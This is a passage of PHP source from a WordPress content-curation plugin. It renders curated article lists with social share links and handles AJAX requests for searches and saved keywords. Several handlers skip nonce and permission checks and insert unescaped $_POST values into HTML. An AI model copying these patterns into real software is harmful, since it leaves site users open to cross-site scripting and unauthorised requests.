                $post_list .= '<span class="keyword cu_keyword_' . $Keyword['id'] . '">' . stripslashes($Keyword['keyword']) . '<a href="javascript:;" search_type="keyword" order_by="total_shares" parameter_id="' . $Keyword['id'] . '" class="cu_le_detail_search remove_red keyword_ignore" class="remove_red"> <i class="fa fa-search"></i></a></span>';
            }
            $post_list .= '</div><div class="content_data">';
            $update_text = urlencode($ContentItem['title']);
            $permalink = urlencode($current_url);
            $api_key = get_option('curation_suite_listening_api_key');
            $base_share_url = CS_API_BASE_URL . 'share/?api_key=' . $api_key . '&platform_id=' . $platform_id . '&cid=' . $ContentItem['id'];

            if ($ContentItem['DomainData']['data']['moz_score'] > 0)
                $post_list .= '<span class="moz_icon"> : ' . $ContentItem['DomainData']['data']['moz_score'] . '</span>';

            $post_list .= '  <span class="cs_share"><i class="fa fa-signal total_share"></i>: ' . number_format($ContentItem['ContentItemData']['data']['share_gravity']) . '</span>';
            $post_list .= '  <span class="cs_share"><i class="fa fa-share-alt-square total_share"></i>: ' . number_format($ContentItem['ContentItemData']['data']['total_shares']) . '</span>';
            $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=facebook&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="facebook"><i class="fa fa-facebook facebook"></i>: ' . $ContentItem['ContentItemData']['data']['facebook_total'] . '</a></span>';
            $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=twitter&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="twitter"><i class="fa fa-twitter twitter"></i>: ' . $ContentItem['ContentItemData']['data']['twitter_shares'] . '</a></span>';
            $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=linkedin&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="linkedin"><i class="fa fa-linkedin linkedin"></i>: ' . $ContentItem['ContentItemData']['data']['linkedin_shares'] . '</a></span>';
            $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=pinterest&text=' . $update_text . '&url=' . $permalink . '&i=' . $ContentItem['image_src'] . '" target="_blank" class="facebook"><i class="fa fa-pinterest pinterest"></i>: ' . $ContentItem['ContentItemData']['data']['pinterest_shares'] . '</a></span>';
            $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=googleplus&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="googleplus"><i class="fa fa-google-plus googleplus"></i>: ' . $ContentItem['ContentItemData']['data']['googleplus_shares'] . '</a></span>';
            $post_list .= '<div class="share_items">
	    <a href="' . $base_share_url . '&network=hootsuite&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="hootsuite"><img class="hootsuite_share" src="' . plugins_url('youbrandinc_products/i/hootsuite-icon_24.png') . '" /></a>
	    <a href="' . $base_share_url . '&network=sniply&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="hootsuite"><img class="hootsuite_share" src="' . plugins_url('curation-suite/i/sniply-icon-28.png') . '" /></a>
    	<a href="' . $base_share_url . '&network=oktopost&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="oktopost"><img class="oktopost_share" src="' . plugins_url('curation-suite/i/oktopost-icon-24.png') . '" /></a>';
            $post_list .= '<a href="' . $base_share_url . '&network=buffer&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="buffer"><img class="buffer_share" src="' . plugins_url('youbrandinc_products/i/buffer-logo.png') . '" /></a>';

            if ($is_video) {
                $post_list .= '<div class="video_data"> <span class="cs_share"><i class="fa fa-eye" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['view_count']) . '</a></span>';
                $post_list .= ' <span class="cs_share"><i class="fa fa-thumbs-up" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['like_count']) . '</a></span>';
                $post_list .= ' <span class="cs_share"><i class="fa fa-thumbs-down" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['dislike_count']) . '</a></span>';
                $post_list .= ' <span class="cs_share"><i class="fa fa-comments-o" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['comment_count']) . '</a></span></div>';
            }

            $post_list .= '</div></div>';
            ///@platform_id/@action/@type/@parameter_id
            $save_content_action = 'add';
            $save_content_icon = '-o';
            if ($platform_sources == 'saved_content_items') // these are the saved items for the platform, if it's loaded then we switch up the actions
            {
                $save_content_action = 'remove'; // this will remove this from the saved
                $save_content_icon = ''; // show the closed icon in these results to signify this content item is saved
            }
            //<a href="javascript:;" class="link_to_load" name="'.($current_url).'" rel="'.$ContentItem['id'].'" after-curation-action="curate-remove">Curate/Remove</a> |
            $post_list .= '</div><td class="cu_listening_actions ' . $content_type_css . '"><span class="cs_le_content_actions">
			<a href="javascript:;" class="link_to_load" name="' . ($current_url) . '" rel="' . $ContentItem['id'] . '" after-curation-action="curate">Curate</a> 
			<a href="javascript:;" cur_action="add" type="ignore-content-item" parameter_id="' . $ContentItem['id'] . '" class="cu_platform_action remove_red"><i class="fa fa-minus-circle"></i> ignore</a> 
			<a href="javascript:;" cur_action="' . $save_content_action . '" type="save-content-item" parameter_id="' . $ContentItem['id'] . '" class="cu_platform_action save_content_item save_content_item_' . $ContentItem['id'] . '">
			 <i class="fa fa-bookmark' . $save_content_icon . '"></i></a></span>';

            if (!$hide_quick_add) {
                $post_list .= '<div class="btn-group quick_buttons">
	              <a class="btn btn-default quick_add_to_post_box" href="javascript:;" rel="alignleft" ci="' . $ContentItem['id'] . '" after-curation-action="curate"><i class="fa fa-align-left"></i></a>
    	          <a class="btn btn-default quick_add_to_post_box" href="javascript:;" rel="aligncenter" ci="' . $ContentItem['id'] . '" after-curation-action="curate"><i class="fa fa-align-center"></i></a>
        	      <a class="btn btn-default quick_add_to_post_box" href="javascript:;" rel="alignright" ci="' . $ContentItem['id'] . '" after-curation-action="curate"><i class="fa fa-align-right"></i></a>
				  <div class="q_msg ci_msg' . $ContentItem['id'] . '"></div>
            	</div>';
                if (!$load_video_player && $is_video) {
                    $post_list .= '<div>' . getAddToPostLink($i, $current_url, '', 'Video') . '</div>';
                }
            }
            $post_list .= ('</td></tr>');
            $i++;
        }
        $post_list .= '</table>';
    }
    return $post_list;
}

/**
 * This function queries the Curation Engine and returns the HTML content from the search.
 *
 *
 * @return JSON string
 */
function ybi_curation_suite_get_listening_content()
{
    $time_start = microtime(true);
    $post_list = '';
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $time_frame = trim($_POST['time_frame']);
    $social_sort = trim($_POST['social_sort']);
    $platform_sources = trim($_POST['platform_sources']);
    $load_direct_share = trim($_POST['load_direct_share']) == 'true';
    $hide_quick_add = trim($_POST['ybi_cs_hide_quick_add']) == 'true';

    $cu_date_sort = trim($_POST['cu_date_sort']);

    $video_sort = trim($_POST['video_sort']);
    $load_video_player = trim($_POST['load_video_player']) == 'true';
    $show_articles = trim($_POST['show_articles']) == 'true';
    $show_videos = trim($_POST['show_videos']) == 'true';
    $le_strict_date_limit = trim($_POST['le_strict_date_limit']) == 'true';
    if($le_strict_date_limit) {
        $le_strict_date_limit = 1;
    } else {
        $le_strict_date_limit = 0;
    }

    $start = trim($_POST['start']);
    $current_page = 0;
    $limit = '20';

    //$post_list .= '<p>Before Call: '.number_format((microtime(true) - $time_start), 15).'</p>';
    //$time_start = microtime(true);
    $results_title = '';
    if ($platform_sources == 'saved_content_items') {
        $current_page = $start;
        $limit = 15;
        $start = ybi_get_start_offset($start, $limit);
        $search_url_arr = array('saved-content-items', $platform_id, $start . ',' . $limit);
        $data = ybi_curation_suite_api_call('', array('sort' => $cu_date_sort,'strict_date_limit'=>$le_strict_date_limit), $search_url_arr);
        $results_title = '<i class="fa fa-bookmark-o"></i> Saved Content';
        //$search_url_arr = array('saved-content-items',$platform_id, $start.','.$limit);
    } else {
        $param_arr = array('show_articles' => $show_articles, 'show_videos' => $show_videos, 'video_sort' => $video_sort, 'strict_date_limit'=>$le_strict_date_limit);
        $search_url_arr = array('search', $platform_id, $topic_id, urlencode($time_frame), $social_sort, $platform_sources, '0,' . $limit);
        $data = ybi_curation_suite_api_call('', $param_arr, $search_url_arr);
    }
    //$post_list .= '<p>after Call: '.number_format((microtime(true) - $time_start), 15).'</p>';
    //$time_start = microtime(true);
    //$post_list .= '<p>URL : '.$data['url'].'</p>';
    $total = $data['total'];
    $results = $data['results'];

    $total = 0;
    if ($results && is_array($results))
        $total = count($results);

    $api_status = $data['status'];
    $api_message = $data['message'];
    $post_list .= add_api_message_controller('post_area', $api_status, $api_message);

    if (is_null($api_status) || $api_status == 'success' && $total == 0)
        $post_list .= '<p class="success_message">' . $api_message . '</p>';

    //$post_list .= '<p>Before function: '.number_format((microtime(true) - $time_start), 15).'</p>';
    $time_start = microtime(true);
    if($results_title != '') {
        $post_list .= '<h3 class="center">' . $results_title . '</h3>';
    }

    $post_list .= cs_le_get_platform_content_for_post_area($platform_id, $platform_sources, $hide_quick_add, $results, $load_video_player);
    //$post_list .= '<p>after function: '.number_format((microtime(true) - $time_start), 15).'</p>';

    echo json_encode(array('results' => $post_list, 'current_page' => $current_page, 'total_posts_display' => $total));
    die();
}

add_action('wp_ajax_ybi_curation_suite_get_listening_content', 'ybi_curation_suite_get_listening_content');
/**
 * This gets the listening content for the custom listening page.
 *
 *
 * @return JSON HTML
 */
function ybi_curation_suite_get_listening_content_reading_page()
{
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $time_frame = trim($_POST['time_frame']);
    $social_sort = trim($_POST['social_sort']);
    $platform_sources = trim($_POST['platform_sources']);
    $load_direct_share = trim($_POST['load_direct_share']) == 'true';
    $video_sort = trim($_POST['video_sort']);
    $load_video_player = trim($_POST['load_video_player']) == 'true';
    $show_articles = trim($_POST['show_articles']) == 'true';
    $show_videos = trim($_POST['show_videos']) == 'true';
    $le_strict_date_limit = trim($_POST['le_strict_date_limit']) == 'true';
    if($le_strict_date_limit) {
        $le_strict_date_limit = 1;
    } else {
        $le_strict_date_limit = 0;
    }

    $start = trim($_POST['start']);

    $current_page = $start;
    $limit = 10;
    $start = ybi_get_start_offset($start, $limit);

    //$time_frame = '7-day';
    $search_url_arr = array('search', $platform_id, $topic_id, urlencode($time_frame), $social_sort, $platform_sources, $start . ',' . $limit);
    $param_arr = array('show_articles' => $show_articles, 'show_videos' => $show_videos, 'video_sort' => $video_sort, 'strict_date_limit' => $le_strict_date_limit);
    //$search_url_arr = array('saved-content-items',$platform_id, $start.','.$limit);
    $data = ybi_curation_suite_api_call('', $param_arr, $search_url_arr);

    //$total = $data['total'];

    $results = $data['results'];
    $api_code = 0;
    if (array_key_exists('code', $results)) {
        $api_code = $results['code'];
    }

    $total = count($results);
    $fav_icon = '';

    $i = 0;
    $post_list = '';
    //$post_list .= '<textarea>'.$data['sql'].'</textarea>';
    //$post_list .= 'start:'.	$start;
    //$page_list = ybi_get_page_row($total, $limit, $current_page, 9, 'move_page');

    if(!$show_articles)
        $show_articles=0;
    if(!$show_videos)
        $show_videos=0;
    $rss_link = 'https://curationwp.com/feeds/cs-feed/?p='.$platform_id.'&tid='.$topic_id.'&s='.$social_sort.'&t='.$time_frame .'&sources='.$platform_sources. '&articles='.$show_articles.'&videos='.$show_videos.'&strict_date_limit='.$le_strict_date_limit;
    $rss_html = '<span class="le_rss_feed_link"><a href="' . $rss_link . '" title="Custom RSS Feed" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i> Feed</a>
    <a href="javascript:;" id="rQ7HRluT48o" class="cs_tutorial_popup" style="color: #00abef; margin: 0;"><i class="fa fa-info-circle"></i></a></span>';
    $post_list .= '<div id="curation_links_pages">Total: <span id="ybi_lp_total">' . $total . '</span> -'. $rss_html . '</div>';
    //$post_list .= '<p style="clear: both;">' . $data['url'] . '</p>';
    //$post_list .= '<p>' . print_r($data['tracking'], true) . '</p>';

    //$sql = str_replace(':','@',$data['sql']);
    //$post_list .= '<p><textarea id="sql">' . $sql . '</textarea></p>';
    $api_status = $data['status'];
    $api_message = $data['message'];

    $post_list .= add_api_message_controller('reading_page', $api_status, $api_message);

    $post_list .= $data['PlatformSettings']['id'];
    //<p class="success_message">' .$api_message .'</p>
    if ($api_status == 'success' && $total == 0 && $api_code == 206) {
        $post_list .= '<div style="text-align: center; width: 100%;">
        <h2>Setting Up Your Platform - Quick Start:</h2>
        <p><iframe width="640" height="360" src="https://www.youtube.com/embed/RQrsFcCckrM" frameborder="0" allowfullscreen></iframe></p></div>';
    }

    //$post_list.='<div class="brick available">what<iframe width="330" height="186" src="https://www.youtube.com/embed/1abJCvRhV-s" frameborder="0" allowfullscreen></iframe></div>';
    //$post_list .='<div class="brick available"><blockquote class="twitter-tweet" lang="en"><p lang="en" dir="ltr">.<a href="https://twitter.com/generalelectric">@generalelectric</a>&#39;s <a href="https://twitter.com/tomkellner">@tomkellner</a> on measuring content marketing success, and how you know you&#39;ve made it <a href="https://twitter.com/hashtag/ThinkContent?src=hash">#ThinkContent</a> <a href="http://t.co/H7RFbT7ImD">pic.twitter.com/H7RFbT7ImD</a></p>&mdash; NewsCred (@newscred) <a href="https://twitter.com/newscred/status/598874472779747328">May 14, 2015</a></blockquote><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>';
    foreach ($results as $ContentItem) {
        if (!($ContentItem['id']))
            continue;

        $post_list .= ybi_listening_page_content($platform_id, $ContentItem, $load_video_player);
        $i++;
    }
    echo json_encode(array('sql' => $data['sql'], 'results' => $post_list, 'current_page' => $current_page, 'total_posts_display' => $c));
    die();
}

add_action('wp_ajax_ybi_curation_suite_get_listening_content_reading_page', 'ybi_curation_suite_get_listening_content_reading_page');
/**
 * This gets the listening content for the custom listening page.
 *
 *
 * @return JSON HTML
 */
function ybi_curation_suite_get_listening_saved_content_for_page()
{
    $platform_id = trim($_POST['platform_id']);
    $cu_date_sort = trim($_POST['cu_date_sort']);
    $load_direct_share = trim($_POST['load_direct_share']) == 'true';
    $start = trim($_POST['start']);

    $current_page = $start;
    $limit = 15;
    $start = ybi_get_start_offset($start, $limit);


    $search_url_arr = array('saved-content-items', $platform_id, $start . ',' . $limit);
    $data = ybi_curation_suite_api_call('', array('sort' => $cu_date_sort), $search_url_arr);

    $total = $data['total'];
    $results = $data['results'];

    $fav_icon = '';

    $i = 0;
    $post_list = '';
    $post_list .= '';
    //$post_list .= 'total:'.	$total . ' - start:'.$start;
    if ($total == 0)
        $post_list .= '<p>You have no saved content.</p>';

    $page_list = ybi_get_page_row($total, $limit, $current_page, 9, 'move_page');
    $post_list .= '<div id="curation_links_pages">' . $page_list . ' Total: ' . $total . '</div>';

    foreach ($results as $ContentItem) {
        if (!($ContentItem['id']))
            continue;

        $post_list .= ybi_listening_page_content($platform_id, $ContentItem);
        $i++;
    }

    echo json_encode(array('sql' => $data['sql'], 'results' => $post_list, 'current_page' => $current_page, 'total_posts_display' => $total, 'title' => 'Saved Content'));
    die();
}

add_action('wp_ajax_ybi_curation_suite_get_listening_saved_content_for_page', 'ybi_curation_suite_get_listening_saved_content_for_page');
/**
 * This gets the listening content for the custom listening page.
 *
 *
 * @return JSON HTML
 */
function ybi_curation_suite_get_listening_platform_display_content_for_page()
{
    $platform_id = trim($_POST['platform_id']);
    $cu_platform_display_parameters = trim($_POST['cu_platform_display_parameters']);
    $load_direct_share = trim($_POST['load_direct_share']) == 'true';
    $start = trim($_POST['start']);

    $current_page = $start;
    $limit = 15;
    $start = ybi_get_start_offset($start, $limit);
    $send_data = array('query_type' => $cu_platform_display_parameters);
    $search_url_arr = array('platform-display-get-content', $platform_id, $start . ',' . $limit);
    $data = ybi_curation_suite_api_call('', $send_data, $search_url_arr);
    $total = $data['total'];
    $results = $data['results'];

    $fav_icon = '';

    $i = 0;
    $post_list = '';
    //$post_list .= '<p>' . $data['url'] . '</p>';
    //$post_list .= 'total:'.	$total . ' - start:'.$start;
    if ($total == 0)
        $post_list .= '<p>You have no content for your News Page.</p>';

    $post_list .= '';
    $page_list = ybi_get_page_row($total, $limit, $current_page, 9, 'move_page');
    $post_list .= '<div id="curation_links_pages">' . $page_list . ' Total: ' . $total . '</div>';


    foreach ($results as $ContentItem) {
        if (!($ContentItem['id']))
            continue;

        $post_list .= ybi_listening_page_content($platform_id, $ContentItem);
        $i++;
    }

    echo json_encode(array('sql' => $data['sql'], 'results' => $post_list, 'current_page' => $current_page, 'total_posts_display' => $c, 'title' => 'Saved Content'));
    die();
}

add_action('wp_ajax_ybi_curation_suite_get_listening_platform_display_content_for_page', 'ybi_curation_suite_get_listening_platform_display_content_for_page');
/**
 * This gets the listening content for the custom listening page.
 *
 * @return JSON HTML
 */
function cs_le_detail_search()
{
    $platform_id = trim($_POST['platform_id']);
    $parameter_id = trim($_POST['parameter_id']); // should be keyword, rss feed, domain, etc.
    $parameter_id = stripslashes($parameter_id);
    $search_type = trim($_POST['search_type']);
    $order_by = trim($_POST['order_by']);
    $cu_current_display_page = trim($_POST['cu_current_display_page']);
    $search_term_element = trim($_POST['le_search_term_element']);
    $search_term_content_type = trim($_POST['le_search_term_content_type']);
    $platform_sources = trim($_POST['platform_sources']);
    $hide_quick_add = trim($_POST['ybi_cs_hide_quick_add']) == 'true';

    $send_data = array('search_type' => $search_type, 'parameter_id' => $parameter_id, 'order_by' => $order_by, 'search_term_element' => $search_term_element, 'search_content_type' => $search_term_content_type);
    $search_url_arr = array('search', 'content', $platform_id);
    $data = ybi_curation_suite_api_call('', $send_data, $search_url_arr);
    $total = $data['total'];
    $results = $data['results'];
    $api_message = $data['message'];
    $post_list = '';
    //$post_list .= '<p>' . $data['url'] . '</p>';
    //$post_list .= 'total:'.	$total . ' - start:'.$start;
    if ($total == 0)
        $post_list .= '<p>' . $api_message . '</p>';

    $post_list .= '';
    $search_type_term = '';
    $search_type_name = '';
    $allow_save = true;
    switch ($search_type) {
        case 'keyword':
            $Keyword = $data['keyword'];
            $search_type_term = 'keyword:';
            $search_type_name = $Keyword['keyword'];
            $allow_save = false;
            break;
        case 'rss_feed':
            $RssFeed = $data['rss_feed'];
            $search_type_term = 'RSS feed:';
            $search_type_name = $RssFeed['name'];
            $allow_save = false;
            break;
        case 'domain_name_id':
            $DomainData = $data['DomainData'];
            $search_type_term = 'domain:';
            $search_type_name = $DomainData['data']['domain_name'];
            break;
        case 'user_search_term':
            $search_term = $data['search_term'];
            $search_term_element = $data['search_term_element'];
            $search_type_term = 'search:';
            $search_type_name = $parameter_id;
            break;
    }
    //<i class="fa fa-search"></i>
    $parameter_class = 'user_' . preg_replace('/\W+/', '', strtolower(strip_tags($parameter_id)));
    $post_list .= '<div id="detail_search_options"><div class="search_type_detail"><i>' . $search_type_term . '</i> <strong class="detail_search_value_text cs_le_detail_item_' . $search_type . '_' . $parameter_class . '">'
        . stripslashes($search_type_name) . '</strong>';

    if ($allow_save)
        $post_list .= ' <a href="javascript:;" search_type="' . $search_type . '" order_by="most_recent" parameter_id="' . $parameter_id . '" class="cs_le_detail_search_save"><i class="fa fa-floppy-o"></i> save</a>';

    $post_list .= '</div><div id="detail_search_sort">';
    $form_options = cs_le_get_sort_values(false);
    foreach ($form_options as $key => $value) {
        $current_view = '';
        if ($key == $order_by): $current_view = ' current_view'; endif;

        $post_list .= '<a href="javascript:;" search_type="' . $search_type . '" order_by="' . $key . '" parameter_id="' . $parameter_id . '" class="cu_le_detail_search detail_sort_link ' . $key . $current_view . '">' . $value . '</a>';
    }
    $post_list .= '</div></div>';
    $post_list .= '<div id="curation_links_pages">Total: ' . $total . '</div>';

    if ($cu_current_display_page == 'listening-page') {
        $post_list .= cs_le_get_platform_content_for_reading_page($platform_id, $results);
    } else {
        $post_list .= cs_le_get_platform_content_for_post_area($platform_id, $platform_sources, $hide_quick_add, $results);
    }
    echo json_encode(array('status' => $data['status'], 'results' => $post_list));
    die();
}

add_action('wp_ajax_cs_le_detail_search', 'cs_le_detail_search');

function cs_le_get_platform_content_for_reading_page($platform_id, $results)
{
    $i = 0;
    $post_list = '';
    foreach ($results as $ContentItem) {
        if (!($ContentItem['id']))
            continue;

        $post_list .= ybi_listening_page_content($platform_id, $ContentItem);
        $i++;
    }
    return $post_list;
}


function cs_compare_parameter_text($a, $b)
{
    return strnatcmp($a['parameter_text'], $b['parameter_text']);
}

/**
 * Loads the local Listening Engine local saved keywords and returns the html results from the wrapper function get_cs_le_search_detail_saved_items_html
 * Requires a platform_id
 */
function cs_le_delete_detail_search_item()
{
    $platform_id = trim($_POST['platform_id']);
    $search_type = trim($_POST['search_type']);
    $data_item = trim($_POST['data_item']);
    $data_text = trim($_POST['data_text']);

    $option_name = 'cs_le_detail_search_saves_' . $search_type . '_' . $platform_id;
    //delete_option($option_name);
    $saved_items = get_option($option_name);
    $new_arr = array();
    if ($saved_items) {
        foreach ($saved_items as $saved_item) {
            if($data_text == $saved_item['parameter_text']) {
                // do nothing
            } else {
                $new_arr[] = $saved_item;
            }
        }
        update_option($option_name,$new_arr);
    }

    $status = 'success';
    $message = 'Item Deleted';
    $post_list = get_cs_le_search_detail_saved_items_html('user_search_term', $platform_id, false);
    echo json_encode(array('status' => $status, 'message' => $message, 'results' => $post_list));
    die();
}

add_action('wp_ajax_cs_le_delete_detail_search_item', 'cs_le_delete_detail_search_item');

/**
 * Loads the local Listening Engine local saved keywords and returns the html results from the wrapper function get_cs_le_search_detail_saved_items_html
 * Requires a platform_id
 */
function cs_load_local_platform_keywords()
{
    $platform_id = trim($_POST['platform_id']);
    $force_repull = trim($_POST['force_repull']);
    $status = 'success';
    $message = '';
    $post_list = get_cs_le_search_detail_saved_items_html('keyword', $platform_id, $force_repull);
    echo json_encode(array('status' => $status, 'message' => $message, 'results' => $post_list));
    die();
}

add_action('wp_ajax_cs_load_local_platform_keywords', 'cs_load_local_platform_keywords');
/**
 * Loads the local Listening local saved websites and returns the html results from the wrapper function get_cs_le_search_detail_saved_items_html
 * Requires a platform_id
 */
function cs_load_local_platform_websites()
{
    $platform_id = trim($_POST['platform_id']);
    $status = 'success';
    $message = '';
    $post_list = get_cs_le_search_detail_saved_items_html('domain_name_id', $platform_id, true);
    echo json_encode(array('status' => $status, 'message' => $message, 'results' => $post_list));
    die();
}

add_action('wp_ajax_cs_load_local_platform_websites', 'cs_load_local_platform_websites');
/**
 * Loads the local Listening local saved user serch terms and returns the html results from the wrapper function get_cs_le_search_detail_saved_items_html
 * Requires a platform_id
 */
function cs_load_local_platform_user_search_terms()
{
    $platform_id = trim($_POST['platform_id']);
    $status = 'success';
    $message = '';
    $post_list = get_cs_le_search_detail_saved_items_html('user_search_term', $platform_id);
    echo json_encode(array('status' => $status, 'message' => $message, 'results' => $post_list));
    die();
}

add_action('wp_ajax_cs_load_local_platform_user_search_terms', 'cs_load_local_platform_user_search_terms');
/**
 * A wrapper function that returns a HTML string used for display and selction of save item types, like local saved Listening Engine keywords, websites, and user search terms
 * We titled these search_types becuase usually these elements allow you to search deeper into a LE.
 *
 * @param string $search_type type of search expects (keyword|domain_name_id|user_search_term)
 * @param int $platform_id the platform ID
 * @param boolean $force_repull should we contact the LE API to get updated data
 *
 * @return string $html an html string ready for output and dipslay
 */
function get_cs_le_search_detail_saved_items_html($search_type, $platform_id, $force_repull = false)
{
    $option_name = 'cs_le_detail_search_saves_' . $search_type . '_' . $platform_id;
    //delete_option($option_name);
    $saved_items = get_option($option_name);
    $search_type_title = '';
    $search_type_help = '';
    $html = '';
    if (is_string($force_repull)) {
        $force_repull = $force_repull == 'true';
    }
    switch ($search_type) {
        case 'keyword':
            $search_type_title = 'Keywords:';
            if (!is_array($saved_items))
                $force_repull = true;

            if ($force_repull) {
                delete_option($option_name);
                cs_le_load_keywords($platform_id);
                $saved_items = get_option($option_name);
                //$html .= 'loaded keywords from LE';
            }
            break;
        case 'domain_name_id':
            $search_type_title = 'Saved Websites:';
            $search_type_help = 'Click on the magnify icon next to a domain and then click save to follow a website.';
            if (!is_array($saved_items))
                $force_repull = true;

            if ($force_repull) {
                //delete_option($option_name);
                cs_le_load_rss_feeds($platform_id);
                $saved_items = get_option($option_name);
                //$html .= 'loaded keywords from LE';
            }

            break;
        case 'user_search_term':
            $search_type_title = 'Saved Search Terms:';
            $search_type_help = 'First perform a search then click save.';
            break;
    }
    $html .= '<ul class="selectable"><i>' . $search_type_title . '</i> ';
    //sort($saved_items);
    if (is_array($saved_items)) {
        uasort($saved_items, 'cs_compare_parameter_text');
    }

    if ($saved_items) {
        foreach ($saved_items as $saved_item) {
            {
                $parameter_class = 'user_' . preg_replace('/\W+/', '', strtolower(strip_tags($saved_item['parameter_id']))) . '_' . $search_type;

                $delete_action_link = '';
                if($search_type=='user_search_term') {
                    $delete_action_link = ' <a href="javascript:;" class="delete_detail_search_item" data-search-type="'.$search_type.'" data-item="'.$parameter_class.'"><i class="fa fa-minus-circle cs_bad" aria-hidden="true"></i></a>';
                    $html .= '<li class="ui-state-default"><a href="javascript:;" search_type="' . $search_type . '" order_by="most_recent" class="cu_le_detail_search ' . $parameter_class . '">'
                        . stripslashes($saved_item['parameter_text']) . '</a>'.$delete_action_link.'</li>';
                } else {
                    $html .= '<li class="ui-state-default"><a href="javascript:;" search_type="' . $search_type . '" order_by="most_recent" parameter_id="' . stripslashes($saved_item['parameter_id']) . '" class="cu_le_detail_search ' . $parameter_class . '">'
                        . stripslashes($saved_item['parameter_text']) . '</a>'.$delete_action_link.'</li>';
                }



            }
        }
    } else {
        $html .= '<li>None saved yet. ' . $search_type_help . '</li>';
    }

    $html .= '</ul>';
    return $html;
}

function cs_le_load_keywords($platform_id)
{

    $send_data = array('platform_id' => $platform_id);
    $parm_url_arr = array('get-platform-topics-sources', $platform_id, 'full');
    $return_data = ybi_curation_suite_api_call('', $send_data, $parm_url_arr);
    $keyword_total = 0;
    $rss_total = 0;
    $i = 0;
    $platform = $return_data['results'];
    $saved_items = null;
    if (count($return_data['results']['topics']) > 0) {
        $saved_items = get_option('cs_le_detail_search_saves_keyword_' . $platform_id);
        if (!is_array($saved_items))
            $saved_items = array();
        foreach ($return_data['results']['topics'] as $topic) {
            $platform_topic_name = $topic['platform_topic_name'];
            $keywords_arr = $topic['keywords'];
            $keyword_count = count($keywords_arr);
            if ($keyword_count > 0) {
                foreach ($keywords_arr as $keyword) {
                    $search_term_html = '';
                    if ($keyword['keyword'] != '') {
                        //$search_term_html = ' : <i>' . stripcslashes($keyword['search_term']) . '</i>';
                        //cs_le_add_search_detail_item('keyword',$keyword['id'],$keyword['keyword'],'platform',$platform_id);
                        $keyword_text = stripslashes($keyword['keyword']);
                        $keyword_text = str_replace('"', '', $keyword_text);
                        $add_element = array('parameter_id' => intval($keyword['id']), 'parameter_text' => $keyword_text, 'parameter_type' => 'platform', 'platform_id' => $platform_id);
                        $saved_items[] = $add_element;
                        $keyword_total++;
                    }
                }
            }
        }
    }
    delete_option('cs_le_detail_search_saves_keyword_' . $platform_id);
    if ($saved_items)
        add_option('cs_le_detail_search_saves_keyword_' . $platform_id, $saved_items);
}


function cs_le_load_rss_feeds($platform_id)
{

    $send_data = array('platform_id' => $platform_id);
    $parm_url_arr = array('get-platform-topics-sources', $platform_id, 'full');
    $return_data = ybi_curation_suite_api_call('', $send_data, $parm_url_arr);
    $keyword_total = 0;
    $rss_total = 0;
    $option_name = 'cs_le_detail_search_saves_domain_name_id_' . $platform_id;
    $i = 0;
    $platform = $return_data['results'];
    $user_saved_sites_arr = array();
    $saved_items = get_option($option_name);
    $unique_domain_name_id_arr = array(); // this will be used to ensure we only add one instance of each domain name
    if (is_array($saved_items)) {
        foreach ($saved_items as $saved_item) {
            // now we go thru and just delete the platform parameter types
            if ($saved_item['parameter_type'] == 'user') {
                $unique_domain_name_id_arr[] = $saved_item['parameter_id']; // this is the domain name id
                $user_saved_sites_arr[] = $saved_item;
            }
        }
    }
    $saved_items = array();
    delete_option($option_name);

    if (count($return_data['results']['topics']) > 0) {
        foreach ($return_data['results']['topics'] as $topic) {
            $platform_topic_name = $topic['platform_topic_name'];
            $rss_source_arr = $topic['RssSources'];
            $rss_count = count($rss_source_arr);
            if ($rss_count > 0) {
                foreach ($rss_source_arr as $rssFeed) {
                    $DomainData = $rssFeed['DomainData'];
                    if ($DomainData['data']['id']) {
                        if ($DomainData['data']['id'] > 0) {
                            if (!in_array($DomainData['data']['id'], $unique_domain_name_id_arr)) {
                                $add_element = array('parameter_id' => intval($DomainData['data']['id']), 'parameter_text' => $DomainData['data']['domain_name'], 'parameter_type' => 'platform', 'platform_id' => $platform_id);
                                $saved_items[] = $add_element;
                                $unique_domain_name_id_arr[] = $DomainData['data']['id']; // this ensures we only have one domain name listed
                                $rss_total++;
                            }
                        }
                    }
                }
            }
        }
        $final_saved_sites = array_merge($user_saved_sites_arr, $saved_items);

        delete_option('cs_le_detail_search_saves_domain_name_id_' . $platform_id);
        add_option('cs_le_detail_search_saves_domain_name_id_' . $platform_id, $final_saved_sites);
    }
}

function cs_le_add_search_detail_item($search_type, $parameter_id, $parameter_text, $parameter_type = 'user', $platform_id)
{
    $saved_items = get_option('cs_le_detail_search_saves_' . $search_type . '_' . $platform_id);

    $add_element = array('parameter_id' => $parameter_id, 'parameter_text' => $parameter_text, 'parameter_type' => $parameter_type, 'platform_id' => $platform_id);
    $do_add = true;

    if ($saved_items) {
        foreach ($saved_items as $saved_item) {
            if ($saved_item['parameter_id'] == $parameter_id) {
                $do_add = false;
                $return_arr = array($status = 'failure', 'message' => 'This item is already added.');
                break;
            }
        }
        if ($do_add) {
            $saved_items[] = $add_element;
        }

    } else {
        $saved_items = array($add_element);
    }
    if ($do_add)
        $return_arr = array($status = 'success', 'message' => 'Item was added.');

    update_option('cs_le_detail_search_saves_' . $search_type . '_' . $platform_id, $saved_items);
    return $return_arr;
}

function cs_le_detail_search_delete_item()
{
    $platform_id = trim($_POST['platform_id']);
